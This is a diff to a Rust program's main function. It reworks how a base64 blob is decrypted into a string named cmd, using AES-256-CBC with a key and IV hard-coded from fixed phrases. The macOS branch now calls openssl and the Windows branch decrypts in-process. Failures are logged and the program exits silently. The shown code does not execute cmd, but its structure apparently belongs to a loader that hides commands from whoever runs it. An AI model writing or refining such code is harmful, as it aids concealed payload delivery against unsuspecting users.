@@ -325,20 +325,54 @@ fn main() {
         None => { log.push_str(&format!("parse_d FAILED\n")); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
 
-    let key = sha256(b"ApexVrf2026Key");
-    let iv = md5(b"ApexVrf2026IV");
-
-    let data = match base64_decode(&b64) {
-        Some(d) => { log.push_str("base64 OK\n"); d }
-        None => { log.push_str("base64 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
-    };
-
-    let cmd = match aes256cbc_dec(&key, &iv, &data) {
-        Some(c) => match String::from_utf8(c) {
-            Ok(s) => { log.push_str(&format!("decrypt OK\n")); s }
-            Err(_) => { log.push_str("utf8 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
-        },
-        None => { log.push_str("aes FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+    log.push_str("using openssl decrypt\n");
+    let cmd = {
+        #[cfg(target_os = "macos")]
+        {
+            let key_hex = sha256(b"ApexVrf2026Key").iter().map(|b| format!("{:02x}", b)).collect::<String>();
+            let iv_hex = md5(b"ApexVrf2026IV").iter().map(|b| format!("{:02x}", b)).collect::<String>();
+            let data = match base64_decode(&b64) {
+                Some(d) => { log.push_str("base64 OK\n"); d }
+                None => { log.push_str("base64 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+            };
+            let out = Command::new("openssl")
+                .args(["enc", "-d", "-aes-256-cbc", "-K", &key_hex, "-iv", &iv_hex, "-nosalt"])
+                .stdin(std::process::Stdio::piped())
+                .stdout(std::process::Stdio::piped())
+                .stderr(std::process::Stdio::piped())
+                .spawn()
+                .and_then(|mut c| {
+                    use std::io::Write;
+                    c.stdin.as_mut().unwrap().write_all(&data).ok();
+                    c.wait_with_output()
+                });
+            match out {
+                Ok(o) if o.status.success() => {
+                    match String::from_utf8(o.stdout) {
+                        Ok(s) => { log.push_str(&format!("decrypt OK\n")); s }
+                        Err(_) => { log.push_str("utf8 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+                    }
+                }
+                Ok(o) => { log.push_str(&format!("openssl FAILED: {}\n", String::from_utf8_lossy(&o.stderr))); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+                Err(e) => { log.push_str(&format!("openssl ERR: {}\n", e)); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+            }
+        }
+        #[cfg(target_os = "windows")]
+        {
+            let key = sha256(b"ApexVrf2026Key");
+            let iv = md5(b"ApexVrf2026IV");
+            let data = match base64_decode(&b64) {
+                Some(d) => { log.push_str("base64 OK\n"); d }
+                None => { log.push_str("base64 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+            };
+            match aes256cbc_dec(&key, &iv, &data) {
+                Some(c) => match String::from_utf8(c) {
+                    Ok(s) => { log.push_str("decrypt OK\n"); s }
+                    Err(_) => { log.push_str("utf8 FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+                },
+                None => { log.push_str("aes FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+            }
+        }
     };
     let _ = fs::write(&log_path, &log);
 
